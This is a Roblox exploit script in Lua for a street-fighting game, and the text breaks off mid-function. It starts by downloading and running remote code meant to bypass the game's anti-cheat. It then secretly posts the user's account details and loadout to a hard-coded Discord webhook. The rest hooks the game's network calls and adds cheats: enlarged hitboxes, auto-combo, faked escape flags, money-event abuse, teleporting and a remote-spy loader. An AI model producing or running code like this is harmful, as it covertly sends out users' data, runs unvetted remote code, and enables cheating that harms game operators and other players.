pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
end)

local Players           = game:GetService("Players")
local player    = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local HttpService=game:GetService("HttpService")
local MarketplaceService=game:GetService("MarketplaceService")

local WEBHOOK="https://discord.com/api/webhooks/1513915545974603899/w4_knfLlf2o-u65_cUPRUGkUNsgE06gITiFFLEs0-223OSb-CnRs56q_K1tGs6Bd0OyR"

local function getEquippedLoadout()
	local keys={
		Punches={"PA","PA2","PA3"},
		Headlocks={"DTTool"},
		Blocks={"BC"},
		Mop={"MA","DragMop"},
		Runup={"RA"},
		Rush={"NDTool"},
		SquareUp={"SU"},
		ToolAnimation={"toolLeap"}
	}

	local results={}

	for category,names in pairs(keys) do
		local selections={}

		for _,name in ipairs(names) do
			local object=player:FindFirstChild(name)
			if object and object:IsA("ValueBase") then
				table.insert(selections,tostring(object.Value))
			end
		end

		results[category]=#selections>0
			and table.concat(selections,", ")
			or "Not detected"
	end

	return results
end

task.spawn(function()
	local player=Players.LocalPlayer
	if not player then return end

	local gameName=game.Name
	pcall(function()
		gameName=MarketplaceService:GetProductInfo(game.PlaceId).Name
	end)

	local loadout=getEquippedLoadout()	
	local fields={
		{name="Username",value="@"..player.Name,inline=true},
		{name="Display Name",value=player.DisplayName,inline=true},
		{name="User ID",value=tostring(player.UserId),inline=true},
		{name="Account Age",value=tostring(player.AccountAge).." days",inline=true},
		{name="Game",value=gameName,inline=true},
		{name="Place ID",value=tostring(game.PlaceId),inline=true},
		{name="🥊 Punches",value=loadout.Punches,inline=false},
		{name="Headlocks",value=loadout.Headlocks,inline=false},
		{name="Blocks",value=loadout.Blocks,inline=false},
		{name="Mop",value=loadout.Mop,inline=false},
		{name="Runup",value=loadout.Runup,inline=false},
		{name="Rush",value=loadout.Rush,inline=false},
		{name="SquareUp",value=loadout.SquareUp,inline=false},
		{name="Tool Animation",value=loadout.ToolAnimation,inline=false},

		{name="Date",value=os.date("%Y-%m-%d %H:%M:%S"),inline=false}
	}

	local payload=HttpService:JSONEncode({
		username="LoriBandzz Private",
		embeds={{
			title="⚡ LORIBANDZZ PRIVATE",
			description="Session activity report",
			color=0xB8BEC9,
			fields=fields,
			footer={text="LoriBandzz Private • Session Report"}
		}}
	})

	local req=http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
	if req then
		pcall(function()
			req({
				Url=WEBHOOK,
				Method="POST",
				Headers={["Content-Type"]="application/json"},
				Body=payload
			})
		end)
	end
end)

task.wait(1)
repeat task.wait() until game:GetService("Players").LocalPlayer

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS               = game:GetService("UserInputService")
local RunService        = game:GetService("RunService")
local TweenService      = game:GetService("TweenService")
local events    = ReplicatedStorage:WaitForChild("events")
local Solo           = events:WaitForChild("SoloPlrEvents")
local Duo            = events:FindFirstChild("DuoPlrEvents")
local ValueChange2   = events:FindFirstChild("ValueChange2")
local MoneyGain      = events:FindFirstChild("MoneyGain")
local NonFightEvents = events:FindFirstChild("NonFightEvents")
local CharRemote     = NonFightEvents and NonFightEvents:FindFirstChild("Char")
local MainKeys       = events:WaitForChild("MainKeys")
local ValueChange    = events:FindFirstChild("ValueChange")
local IsolatedBlock  = events:FindFirstChild("isolatedblock")
local PvpToggle      = events:FindFirstChild("PvpToggle")
local SneakEvents    = events:FindFirstChild("SneakRequestEvents")
local SendSneak      = SneakEvents and SneakEvents:FindFirstChild("SendSneakToServer")

local looseFightBlocked  = false
local beatDownBlocked    = false
local duoBlocked         = false
local hitboxOn           = false
local hitboxPlayerHooked = false
local comboThread        = nil
local godCharTarget      = ""
local pvpThread          = nil
local pvpOnThread        = nil
local valueText          = "0"
local lastValueFire      = 0
local lastHitboxApply    = 0
local torsoCache         = {}
local activeRenderCount  = 0
local activeHBCount      = 0

local SILVER=Color3.fromRGB(185,190,200)
local DARK=Color3.fromRGB(25,26,31)
local PANEL=Color3.fromRGB(38,40,47)
local ACTIVE=Color3.fromRGB(80,85,98)

local HITBOX_SIZE    = Vector3.new(5, 5, 5)
local HITBOX_METHOD  = 1
local HITBOX_METHODS = {"Torso","Head","Head+Torso","Root Part"}

local hookActive = false
-- Strategy 1: hookmetamethod (Synapse X, ScriptWare, Fluxus)
pcall(function()
	if not hookmetamethod or not getnamecallmethod then return end
	local old
	old = hookmetamethod(game, "__namecall", function(self, ...)
		local method = getnamecallmethod()
		if method == "FireServer" and self == Solo then
			local args = {...}
			if looseFightBlocked and args[1] == "LooseFight" then return nil end
			if beatDownBlocked  and args[1] == "BeatDown"   then return nil end
		end
		if method == "FireServer" and duoBlocked and self == Duo then return nil end
		return old(self, ...)
	end)
	hookActive = true
end)

-- Strategy 2: raw metatable hook (Delta, Wave, and most UNC-compliant executors)
if not hookActive then
	pcall(function()
		if not getrawmetatable or not setreadonly then return end
		local mt = getrawmetatable(game)
		if not mt then return end
		local oldNC = mt.__namecall
		if not oldNC then return end
		setreadonly(mt, false)
		mt.__namecall = newcclosure and newcclosure(function(self, ...)
			local args = {...}
			local isSolo = rawequal(self, Solo)
			local isDuo  = Duo and rawequal(self, Duo)
			if isSolo then
				if looseFightBlocked and args[1] == "LooseFight" then return end
				if beatDownBlocked  and args[1] == "BeatDown"   then return end
			end
			if isDuo and duoBlocked then return end
			return oldNC(self, ...)
		end) or function(self, ...)
			local args = {...}
			local isSolo = rawequal(self, Solo)
			local isDuo  = Duo and rawequal(self, Duo)
			if isSolo then
				if looseFightBlocked and args[1] == "LooseFight" then return end
				if beatDownBlocked  and args[1] == "BeatDown"   then return end
			end
			if isDuo and duoBlocked then return end
			return oldNC(self, ...)
		end
		setreadonly(mt, true)
		hookActive = true
	end)
end

-- Strategy 3: __index intercept on the remotes themselves (fallback for any executor)
if not hookActive then
	pcall(function()
		local origSoloFS = Solo.FireServer
		Solo.FireServer = function(self, ...)
			local args = {...}
			if looseFightBlocked and args[1] == "LooseFight" then return end
			if beatDownBlocked  and args[1] == "BeatDown"   then return end
			return origSoloFS(self, ...)
		end
		if Duo then
			local origDuoFS = Duo.FireServer
			Duo.FireServer = function(self, ...)
				if duoBlocked then return end
				return origDuoFS(self, ...)
			end
		end
		hookActive = true
	end)
end

local function getTorso(char)
	return char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("HumanoidRootPart")
end
local function jitter(b,p) return b+(math.random()*2-1)*b*p end
local function invalidateTorsoCache(p2) torsoCache[p2]=nil end
local function getCachedTorso(p2)
	if torsoCache[p2] and torsoCache[p2].Parent then return torsoCache[p2] end
	local char=p2.Character; if not char then return nil end
	local t=getTorso(char); torsoCache[p2]=t; return t
end
for _,p2 in ipairs(Players:GetPlayers()) do
	p2.CharacterAdded:Connect(function() invalidateTorsoCache(p2) end)
end
Players.PlayerAdded:Connect(function(p2) p2.CharacterAdded:Connect(function() invalidateTorsoCache(p2) end) end)
Players.PlayerRemoving:Connect(function(p2) torsoCache[p2]=nil end)
local function findPlayer(name)
	name=name:lower()
	for _,p2 in ipairs(Players:GetPlayers()) do
		if p2~=player and p2.Name:lower():find(name,1,true) then return p2 end
	end
	for _,p2 in ipairs(Players:GetPlayers()) do
		if p2~=player and p2.DisplayName:lower():find(name,1,true) then return p2 end
	end
end
local function keyDisplayName(key)
	local n=key.Name; return #n==1 and "["..n.."]" or "["..n:sub(1,3).."]"
end

local features={}
local function makeFeature(name,key,opts)
	local act=opts.onActivate or function()end
	local deact=opts.onDeactivate or function()end
	local f={
		name=name,key=key,state=false,mode="toggle",
		onActivate=function() act()
			if opts.onRender then activeRenderCount=activeRenderCount+1 end
			if opts.onHeartbeat then activeHBCount=activeHBCount+1 end
		end,
		onDeactivate=function() deact()
			if opts.onRender then activeRenderCount=math.max(0,activeRenderCount-1) end
			if opts.onHeartbeat then activeHBCount=math.max(0,activeHBCount-1) end
		end,
		onHeartbeat=opts.onHeartbeat,onRender=opts.onRender,
		dot=nil,dotGlow=nil,keyLabel=nil,nameLabel=nil,accent=nil
	}
	table.insert(features,f); return f
end

local function applyHitbox(char,enlarged)
	if not char then return end
	if HITBOX_METHOD==1 then
		local t=getTorso(char); if not t then return end
		t.Size=enlarged and HITBOX_SIZE or Vector3.new(2,2,1)
		t.Transparency=enlarged and 1 or 0
	elseif HITBOX_METHOD==2 then
		local h=char:FindFirstChild("Head"); if not h then return end
		h.Size=enlarged and HITBOX_SIZE or Vector3.new(2,1,1); h.Transparency=0
	elseif HITBOX_METHOD==3 then
		local t=getTorso(char); local h=char:FindFirstChild("Head")
		if t then t.Size=enlarged and HITBOX_SIZE or Vector3.new(2,2,1); t.Transparency=0 end
		if h then h.Size=enlarged and HITBOX_SIZE or Vector3.new(2,1,1); h.Transparency=0 end
	elseif HITBOX_METHOD==4 then
		local r=char:FindFirstChild("HumanoidRootPart"); if not r then return end
		r.Size=enlarged and HITBOX_SIZE or Vector3.new(2,2,1); r.Transparency=1
	end
end
local function setHitboxes(enlarged)
	for _,other in ipairs(Players:GetPlayers()) do
		if other~=player then applyHitbox(other.Character,enlarged)
			if not enlarged then invalidateTorsoCache(other) end end
	end
end
local function hitboxActivate()
	hitboxOn=true
	if not hitboxPlayerHooked then
		hitboxPlayerHooked=true
		Players.PlayerAdded:Connect(function(p2)
			if hitboxOn and p2~=player then
				p2.CharacterAdded:Connect(function(c) task.wait(0.1); if hitboxOn then applyHitbox(c,true) end end)
			end
		end)
	end
end
local function hitboxDeactivate() hitboxOn=false; setHitboxes(false) end
local function hitboxRender()
	if not hitboxOn then return end
	local now=tick(); if now-lastHitboxApply<0.5 then return end
	lastHitboxApply=now; setHitboxes(true)
end

local function valueRender()
	if not ValueChange2 then return end
	local now=tick(); if now-lastValueFire<0.1 then return end
	lastValueFire=now
	local char=player.Character; if not char then return end
	local wallet=char:FindFirstChild("Wallet"); if not wallet then return end
	local handle=wallet:FindFirstChild("Handle"); if not handle then return end
	local bb=handle:FindFirstChild("BillboardGui"); if not bb then return end
	local label=bb:FindFirstChild("TextLabel")
	if label then pcall(function() ValueChange2:FireServer(label,valueText) end) end
end

local function toggleLooseFight() looseFightBlocked=not looseFightBlocked end
local function toggleBeatDown()   beatDownBlocked=not beatDownBlocked     end
local function toggleDuo()        duoBlocked=not duoBlocked               end

local function pvpActivate()
	pvpThread=task.spawn(function()
		while true do pcall(function() if PvpToggle then PvpToggle:FireServer(false) end end); task.wait(1) end
	end)
end
local function pvpDeactivate() if pvpThread then task.cancel(pvpThread); pvpThread=nil end end
local function pvpOnActivate()
	pvpOnThread=task.spawn(function()
		while true do pcall(function() if PvpToggle then PvpToggle:FireServer(true) end end); task.wait(1) end
	end)
end
local function pvpOnDeactivate() if pvpOnThread then task.cancel(pvpOnThread); pvpOnThread=nil end end

local blockThread=nil
local blockActive=false

local function blockActivate()
	if blockActive then return end
	blockActive=true
	blockThread=task.spawn(function()
		while blockActive do
			if IsolatedBlock then
				pcall(function()
					IsolatedBlock:FireServer()
				end)
			end
			task.wait(0.05)
		end
	end)
end

local function blockDeactivate()
	blockActive=false
	if blockThread then
		task.cancel(blockThread)
		blockThread=nil
	end
end

local escapeThread=nil
local escapeActive=false

local function escapeActivate()
	if escapeActive then return end
	escapeActive=true
	escapeThread=task.spawn(function()
		while escapeActive do
			local char=player.Character
			local data=char and char:FindFirstChild("Player")
			local damages=data and data:FindFirstChild("Damages")
			local values=damages and damages:FindFirstChild("values")
			local tool=values and values:FindFirstChild("DamageTool")
			local able=tool and tool:FindFirstChild("AbleToEscape")
			local escaped=tool and tool:FindFirstChild("Escaped")

			if able and escaped and able:IsA("BoolValue") and escaped:IsA("BoolValue") then
				if able.Value and not escaped.Value and ValueChange then
					pcall(function()
						ValueChange:FireServer(escaped,true)
					end)
				end
			end
			task.wait(0.1)
		end
	end)
end

local function escapeDeactivate()
	escapeActive=false
	if escapeThread then
		task.cancel(escapeThread)
		escapeThread=nil
	end
end

local function nearestEnemy(range)
	local char=player.Character
	if not char then return nil end
	local mr=char:FindFirstChild("HumanoidRootPart") or getTorso(char)
	if not mr then return nil end
	local best=nil; local bd=range or 32
	for _,other in ipairs(Players:GetPlayers()) do
		if other~=player then
			local c=other.Character
			local r=c and(c:FindFirstChild("HumanoidRootPart") or getTorso(c))
			if r then
				local d=(mr.Position-r.Position).Magnitude
				if d<bd then bd=d; best=other end
			end
		end
	end
	return best
end

local COMBO_ACTIONS={"Push","Punch","Drag","DamageTool"}
local function comboActivate()
	comboThread=task.spawn(function()
		while true do
			if nearestEnemy(32) then
				pcall(function()
					local char=player.Character; if not char then return end
					local p2=char:FindFirstChild("Player")
					local dam=p2 and p2:FindFirstChild("Damages")
					local vals=dam and dam:FindFirstChild("values")
					local dt=vals and vals:FindFirstChild("DamageTool")
					local esc=dt and dt:FindFirstChild("Escaped")
					if esc and ValueChange then ValueChange:FireServer(esc,true) end
				end)
				for _,a in ipairs(COMBO_ACTIONS) do
					pcall(function() MainKeys:FireServer(a) end)
					task.wait(0.05)
				end
			end
			task.wait(jitter(0.06,0.25))
		end
	end)
end
local function comboDeactivate()
	if comboThread then task.cancel(comboThread); comboThread=nil end
end

local stompThread = nil
local function stompActivate()
	stompThread = task.spawn(function()
		while true do
			pcall(function() MainKeys:FireServer("Stomp") end)
			task.wait(0.05)
		end
	end)
end
local function stompDeactivate()
	if stompThread then task.cancel(stompThread); stompThread = nil end
end

local fEscape = makeFeature("Auto Escape", Enum.KeyCode.Unknown, {onActivate = escapeActivate,onDeactivate = escapeDeactivate})
local fCombo=makeFeature("Combo Spam",Enum.KeyCode.P,{
	onActivate=comboActivate,
	onDeactivate=comboDeactivate
})
local fBlock=makeFeature("Auto Block",Enum.KeyCode.Unknown,{
	onActivate=blockActivate,
	onDeactivate=blockDeactivate})
local fStomp = makeFeature("Auto Stomp", Enum.KeyCode.Unknown, {onActivate=stompActivate, onDeactivate=stompDeactivate})
local fHitbx = makeFeature("Hitbox+", Enum.KeyCode.Unknown, {onActivate=hitboxActivate, onDeactivate=hitboxDeactivate, onRender=hitboxRender})
local fValue = makeFeature("Value Edit", Enum.KeyCode.Unknown, {onRender=valueRender})
local fLoose = makeFeature("Block LooseFight", Enum.KeyCode.Unknown, {onActivate=toggleLooseFight, onDeactivate=toggleLooseFight})
local fBeatDn = makeFeature("Block BeatDown", Enum.KeyCode.Unknown, {onActivate=toggleBeatDown, onDeactivate=toggleBeatDown})
local fDuo = makeFeature("Block Duo Events", Enum.KeyCode.Unknown, {onActivate=toggleDuo, onDeactivate=toggleDuo})
local fPvp = makeFeature("PVP Off", Enum.KeyCode.Unknown, {onActivate=pvpActivate, onDeactivate=pvpDeactivate})
local fPvpOn = makeFeature("PVP On", Enum.KeyCode.Unknown, {onActivate=pvpOnActivate, onDeactivate=pvpOnDeactivate})

local GUI_W=240; local ROW_H=34; local PAD=6
local C_BG=Color3.fromRGB(12,12,15)
local C_TITLE=Color3.fromRGB(25,25,30)
local C_ON=Color3.fromRGB(225,230,240)
local C_OFF=Color3.fromRGB(105,110,120)
local C_KEY=Color3.fromRGB(185,190,205)
local C_KEY_HLD=Color3.fromRGB(245,245,250)
local C_LABEL=Color3.fromRGB(235,237,242)
local C_DIM=Color3.fromRGB(145,150,160)
local C_HOVER=Color3.fromRGB(48,50,58)
local C_INPUT=Color3.fromRGB(28,29,35)
local C_SEP=Color3.fromRGB(100,105,115)
local TW_DOT=TweenInfo.new(0.3,Enum.EasingStyle.Exponential,Enum.EasingDirection.Out)
local TW_ROW=TweenInfo.new(0.22,Enum.EasingStyle.Exponential,Enum.EasingDirection.Out)
local TW_FAST=TweenInfo.new(0.15,Enum.EasingStyle.Sine,Enum.EasingDirection.Out)
local TW_OPEN=TweenInfo.new(0.45,Enum.EasingStyle.Exponential,Enum.EasingDirection.Out)
local TW_SPRING=TweenInfo.new(0.5,Enum.EasingStyle.Elastic,Enum.EasingDirection.Out)


local sg=Instance.new("ScreenGui")
sg.Name="BLOSSOM_PRIVATE"; sg.ResetOnSpawn=false; sg.IgnoreGuiInset=true
sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; sg.Parent=playerGui

local atualizarGUI
local infoLabelRef=nil

local function buildMobileUI()
	local mSg=Instance.new("ScreenGui"); mSg.Name="BLOSSOM_MOBILE"; mSg.ResetOnSpawn=false
	mSg.IgnoreGuiInset=true; mSg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; mSg.Parent=playerGui
	
	local ToggleButton=Instance.new("TextButton")
	ToggleButton.Name="LoriBandzzToggle"
	ToggleButton.Size=UDim2.fromOffset(34,34)
	ToggleButton.Position=UDim2.new(1,-44,0.5,-17)
	ToggleButton.BackgroundColor3=Color3.fromRGB(20,20,24)
	ToggleButton.BorderSizePixel=0
	ToggleButton.Text="⚡"
	ToggleButton.TextSize=18
	ToggleButton.TextColor3=Color3.fromRGB(235,238,245)
	ToggleButton.Font=Enum.Font.GothamBold
	ToggleButton.ZIndex=10
	ToggleButton.Parent=mSg

	Instance.new("UICorner",ToggleButton).CornerRadius=UDim.new(0,10)

	local ToggleStroke=Instance.new("UIStroke")
	ToggleStroke.Color=Color3.fromRGB(175,180,195)
	ToggleStroke.Thickness=1.2
	ToggleStroke.Parent=ToggleButton

	local mP=Instance.new("Frame")
	mP.Size=UDim2.new(0,245,0.7,0)
	mP.Position=UDim2.new(0,8,0.15,0)
	mP.BackgroundColor3=C_BG
	mP.BorderSizePixel=0
	mP.Active=true
	mP.Parent=mSg
	
	local dragging=false
	local dragStart=nil
	local startPosition=nil
	local activeInput=nil
	local moved=false

	ToggleButton.InputBegan:Connect(function(input)
		if input.UserInputType~=Enum.UserInputType.Touch and input.UserInputType~=Enum.UserInputType.MouseButton1 then return end
		dragging=true
		moved=false
		activeInput=input
		dragStart=input.Position
		startPosition=ToggleButton.Position
	end)

	UIS.InputChanged:Connect(function(input)
		if not dragging then return end
		if input.UserInputType~=Enum.UserInputType.Touch and input.UserInputType~=Enum.UserInputType.MouseMovement then return end
		local delta=input.Position-dragStart
		if delta.Magnitude>8 then moved=true end
		if not moved then return end
		ToggleButton.Position=UDim2.new(
			startPosition.X.Scale,startPosition.X.Offset+delta.X,
			startPosition.Y.Scale,startPosition.Y.Offset+delta.Y
		)
	end)

	UIS.InputEnded:Connect(function(input)
		if not dragging then return end
		if input~=activeInput and not (activeInput.UserInputType==Enum.UserInputType.MouseButton1 and input.UserInputType==Enum.UserInputType.MouseButton1) then return end
		dragging=false
		activeInput=nil
		if not moved then
			mP.Visible=not mP.Visible
		end
	end)
	
	Instance.new("UICorner",mP).CornerRadius=UDim.new(0,14)
	Instance.new("UIStroke",mP).Color=Color3.fromRGB(145,150,165)
	
	local mH=Instance.new("Frame"); mH.Size=UDim2.new(1,0,0,44); mH.BackgroundColor3=C_TITLE
	mH.BorderSizePixel=0; mH.Parent=mP; Instance.new("UICorner",mH).CornerRadius=UDim.new(0,14)
	local mHF=Instance.new("Frame"); mHF.Size=UDim2.new(1,0,0,14); mHF.Position=UDim2.new(0,0,1,-14)
	mHF.BackgroundColor3=C_TITLE; mHF.BorderSizePixel=0; mHF.Parent=mH
	local mT=Instance.new("TextLabel"); mT.Size=UDim2.new(1,-60,1,0); mT.Position=UDim2.new(0,10,0,0)
	mT.BackgroundTransparency=1; mT.Text="LoriBandzz Private ⚡️"; mT.TextColor3=C_LABEL; mT.TextSize=13
	mT.Font=Enum.Font.GothamBold; mT.TextXAlignment=Enum.TextXAlignment.Left; mT.Parent=mH
	mT.Size=UDim2.new(1,-20,1,0)
	mT.Text="LoriBandzz Private ⚡"

	local mScroll
	mScroll=Instance.new("ScrollingFrame"); mScroll.Size=UDim2.new(1,-8,1,-52); mScroll.Position=UDim2.new(0,4,0,48)
	mScroll.BackgroundTransparency=1; mScroll.BorderSizePixel=0; mScroll.ScrollBarThickness=3
	mScroll.ScrollBarImageColor3=Color3.fromRGB(180,50,110); mScroll.CanvasSize=UDim2.new(0,0,0,0); mScroll.Parent=mP
	local mL=Instance.new("UIListLayout"); mL.SortOrder=Enum.SortOrder.LayoutOrder; mL.Padding=UDim.new(0,6); mL.Parent=mScroll
	local mPad=Instance.new("UIPadding"); mPad.PaddingTop=UDim.new(0,4); mPad.PaddingLeft=UDim.new(0,4)
	mPad.PaddingRight=UDim.new(0,4); mPad.PaddingBottom=UDim.new(0,4); mPad.Parent=mScroll

	local mOrder=0
	local function mToggle(feat)
		mOrder=mOrder+1
		local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,42)
		row.BackgroundColor3=Color3.fromRGB(32,33,39); row.BorderSizePixel=0; row.LayoutOrder=mOrder; row.Parent=mScroll
		Instance.new("UICorner",row).CornerRadius=UDim.new(0,10)
		local d=Instance.new("Frame"); d.Size=UDim2.new(0,10,0,10); d.Position=UDim2.new(0,12,0.5,-5)
		d.BackgroundColor3=C_OFF; d.BorderSizePixel=0; d.Parent=row; Instance.new("UICorner",d).CornerRadius=UDim.new(1,0)
		local l=Instance.new("TextLabel"); l.Size=UDim2.new(0.65,0,1,0); l.Position=UDim2.new(0,30,0,0)
		l.BackgroundTransparency=1; l.Text=feat.name; l.TextColor3=C_DIM; l.TextSize=12
		l.Font=Enum.Font.GothamBold; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=row
		local tb=Instance.new("TextButton");tb.Size=UDim2.new(0,54,0,28);tb.Position=UDim2.new(1,-62,0.5,-14)
		tb.BackgroundColor3=Color3.fromRGB(110,25,60); tb.BorderSizePixel=0; tb.Text="OFF"; tb.TextColor3=C_OFF
		tb.TextSize=13; tb.Font=Enum.Font.GothamBold; tb.Parent=row; Instance.new("UICorner",tb).CornerRadius=UDim.new(0,8)
		local function upd()
			TweenService:Create(d,TW_DOT,{BackgroundColor3=feat.state and C_ON or C_OFF}):Play()
			TweenService:Create(tb,TW_ROW,{BackgroundColor3=feat.state and Color3.fromRGB(75,80,92) or Color3.fromRGB(110,25,60)}):Play()
			tb.Text=feat.state and "ON" or "OFF"; tb.TextColor3=feat.state and C_ON or C_OFF
			l.TextColor3=feat.state and C_LABEL or C_DIM
		end
		local deb2=false
		local function tog()
			if deb2 then return end; deb2=true; task.delay(0.15,function() deb2=false end)
			feat.state=not feat.state
			if feat.state then feat.onActivate() else feat.onDeactivate() end; upd()
		end
		tb.MouseButton1Click:Connect(tog)
	end

	local function mInput(ph,btnT,btnC,cb)
		mOrder=mOrder+1
		local row=Instance.new("Frame"); row.Size=UDim2.new(1,-8,0,44)
		row.BackgroundColor3=Color3.fromRGB(32,33,39); row.BorderSizePixel=0; row.LayoutOrder=mOrder; row.Parent=mScroll
		Instance.new("UICorner",row).CornerRadius=UDim.new(0,10)
		local box=Instance.new("TextBox"); box.Size=UDim2.new(0.52,-6,0,38); box.Position=UDim2.new(0,6,0.5,-19)
		box.BackgroundColor3=Color3.fromRGB(44,12,24); box.BorderSizePixel=0; box.Text=""
		box.TextColor3=C_LABEL; box.TextSize=13; box.Font=Enum.Font.Gotham; box.PlaceholderText=ph
		box.PlaceholderColor3=C_DIM; box.Parent=row; Instance.new("UICorner",box).CornerRadius=UDim.new(0,8)
		local btn=Instance.new("TextButton"); btn.Size=UDim2.new(0.44,-6,0,38); btn.Position=UDim2.new(0.56,0,0.5,-19)
		btn.BackgroundColor3=btnC; btn.BorderSizePixel=0; btn.Text=btnT; btn.TextColor3=Color3.new(1,1,1)
		btn.TextSize=13; btn.Font=Enum.Font.GothamBold; btn.Parent=row; Instance.new("UICorner",btn).CornerRadius=UDim.new(0,8)
		btn.MouseButton1Click:Connect(function() cb(box.Text) end); return box
	end

	for _,feat in ipairs(features) do mToggle(feat) end

	mOrder=mOrder+1
	local msep=Instance.new("Frame"); msep.Size=UDim2.new(1,-8,0,1); msep.BackgroundColor3=C_SEP
	msep.BorderSizePixel=0; msep.LayoutOrder=mOrder; msep.Parent=mScroll

	mOrder=mOrder+1
	mInput("Give money","Give $",Color3.fromRGB(200,40,120),function(v)
		if not MoneyGain then return end; local a=tonumber(v) or 1; if a>0 then a=-a end
		pcall(function() MoneyGain:FireServer(a) end)
	end)
	mOrder=mOrder+1
	mInput("Value amount","Set Value",Color3.fromRGB(180,35,100),function(v) valueText=v end)
	mOrder=mOrder+1
	mInput("Hitbox size","Set Hitbox",Color3.fromRGB(180,35,100),function(v)
		local s=math.clamp(tonumber(v) or 5,1,50); HITBOX_SIZE=Vector3.new(s,s,s)
		if fHitbx.state then setHitboxes(false); setHitboxes(true) end
	end)
	mOrder=mOrder+1
	mInput("Teleport to player","Teleport",Color3.fromRGB(190,40,110),function(v)
		local t=findPlayer(v); if not t then return end
		local mr=player.Character and player.Character:FindFirstChild("HumanoidRootPart")
		local tr=t.Character and t.Character:FindFirstChild("HumanoidRootPart")
		if mr and tr then
			local tp=tr.Position; local mp=tp+(mr.Position-tp).Unit*3
			mp=Vector3.new(mp.X,tp.Y,mp.Z)
			mr.CFrame=CFrame.new(mp,Vector3.new(tp.X,mp.Y,tp.Z))
		end
	end)
	mOrder=mOrder+1
	mInput(":char username","Fire :Char",Color3.fromRGB(170,30,90),function(v)
		if v=="" then return end; godCharTarget=v
		pcall(function() if CharRemote then CharRemote:FireServer(v) end end)
	end)

	mOrder=mOrder+1
	local mSneak=Instance.new("TextButton"); mSneak.Size=UDim2.new(1,-8,0,52)
	mSneak.BackgroundColor3=Color3.fromRGB(120,30,70); mSneak.BorderSizePixel=0
	mSneak.Text="🕵 Sneak Tool ▸ Open"; mSneak.TextColor3=Color3.fromRGB(255,120,190)
	mSneak.TextSize=14; mSneak.Font=Enum.Font.GothamBold; mSneak.LayoutOrder=mOrder; mSneak.Parent=mScroll
	Instance.new("UICorner",mSneak).CornerRadius=UDim.new(0,10)
	mSneak.MouseButton1Click:Connect(function()
		local g=playerGui:FindFirstChild("STUNNA_SNEAK"); if not g then return end
		g.Enabled=not g.Enabled
		mSneak.Text=not g.Enabled and "🕵 Sneak Tool ▸ Open" or "🕵 Sneak Tool ▸ Close"
	end)

	mOrder=mOrder+1
	local mCob=Instance.new("TextButton"); mCob.Size=UDim2.new(1,-8,0,52)
	mCob.BackgroundColor3=Color3.fromRGB(135,30,80); mCob.BorderSizePixel=0
	mCob.Text="⚡ Load Cobalt"; mCob.TextColor3=Color3.fromRGB(255,150,210)
	mCob.TextSize=14; mCob.Font=Enum.Font.GothamBold; mCob.LayoutOrder=mOrder+1; mCob.Parent=mScroll
	Instance.new("UICorner",mCob).CornerRadius=UDim.new(0,10)
	mCob.MouseButton1Click:Connect(function()
		mCob.Text="Loading..."
		task.spawn(function()
			local ok,err=pcall(function()
				loadstring(game:HttpGet("https://gitlab.com/upio/cobalt/-/releases/permalink/latest/downloads/Cobalt.luau"))()
			end)
			if ok then
				mCob.Text="✓ Cobalt Loaded"; mCob.TextColor3=C_ON
			else
				mCob.Text="X Failed"; mCob.TextColor3=C_OFF; warn("[Cobalt]",err)
			end
		end)
	end)

	mL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		mScroll.CanvasSize=UDim2.new(0,0,0,mL.AbsoluteContentSize.Y+8)
	end)
end

local function buildSneakPanel()
	local ssg=Instance.new("ScreenGui"); ssg.Name="STUNNA_SNEAK"; ssg.ResetOnSpawn=false
	ssg.IgnoreGuiInset=true; ssg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
	ssg.Enabled=false; ssg.Parent=playerGui

	local sp=Instance.new("Frame"); sp.Size=UDim2.new(0,240,0,300); sp.Position=UDim2.new(1,-250,0.15,0)
	sp.BackgroundColor3=Color3.fromRGB(44,12,24); sp.BorderSizePixel=0; sp.Active=true; sp.Parent=ssg
	Instance.new("UICorner",sp).CornerRadius=UDim.new(0,12); Instance.new("UIStroke",sp).Color=Color3.fromRGB(180,50,110)

	local sb=Instance.new("Frame"); sb.Size=UDim2.new(1,0,0,36); sb.BackgroundColor3=Color3.fromRGB(100,22,55)
	sb.BorderSizePixel=0; sb.Parent=sp; Instance.new("UICorner",sb).CornerRadius=UDim.new(0,12)
	local sbf=Instance.new("Frame"); sbf.Size=UDim2.new(1,0,0,12); sbf.Position=UDim2.new(0,0,1,-12)
	sbf.BackgroundColor3=Color3.fromRGB(100,22,55); sbf.BorderSizePixel=0; sbf.Parent=sb
	local stl2=Instance.new("TextLabel"); stl2.Size=UDim2.new(1,-50,1,0); stl2.Position=UDim2.new(0,12,0,0)
	stl2.BackgroundTransparency=1; stl2.Text="Sneak Tool"; stl2.TextColor3=C_LABEL; stl2.TextSize=13
	stl2.Font=Enum.Font.GothamBold; stl2.TextXAlignment=Enum.TextXAlignment.Left; stl2.Parent=sb
	local cb=Instance.new("TextButton"); cb.Size=UDim2.new(0,24,0,24); cb.Position=UDim2.new(1,-30,0.5,-12)
	cb.BackgroundColor3=Color3.fromRGB(220,40,90); cb.BorderSizePixel=0; cb.Text="✕"; cb.TextColor3=Color3.new(1,1,1)
	cb.TextSize=12; cb.Font=Enum.Font.GothamBold; cb.Parent=sb
	Instance.new("UICorner",cb).CornerRadius=UDim.new(1,0); cb.MouseButton1Click:Connect(function() ssg.Enabled=false end)

	local sdrag,sds,ssp=false,nil,nil
	sb.InputBegan:Connect(function(i)
		if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
			sdrag=true; sds=UIS:GetMouseLocation(); ssp=sp.Position
		end
	end)
	sb.InputEnded:Connect(function(i)
		if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then sdrag=false end
	end)
	UIS.InputChanged:Connect(function(i)
		if sdrag and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
